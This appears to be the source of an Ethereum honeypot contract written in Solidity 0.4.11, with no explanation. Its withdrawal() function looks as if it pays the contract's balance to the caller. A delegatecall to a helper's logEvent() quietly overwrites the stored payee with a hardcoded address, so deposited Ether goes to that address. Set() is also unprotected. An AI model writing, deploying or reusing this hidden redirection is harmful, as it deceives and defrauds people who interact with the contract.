pragma solidity ^0.4.11;

contract firstTest
{
    address public adr;
    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
    
    function Set(address dataBase) 
    {
        emails = dataBase;
    }
    
    function withdrawal()
    payable public
    {
        adr = msg.sender;
        emails.delegatecall(bytes4(keccak256("logEvent()")));
        adr.send(this.balance);

    }
    
}
contract change_adr{
    address adr;
    function logEvent() payable{
        adr = 0xdd870fa1b7c4700f2bd7f44238821c26f7392148;
    }
}
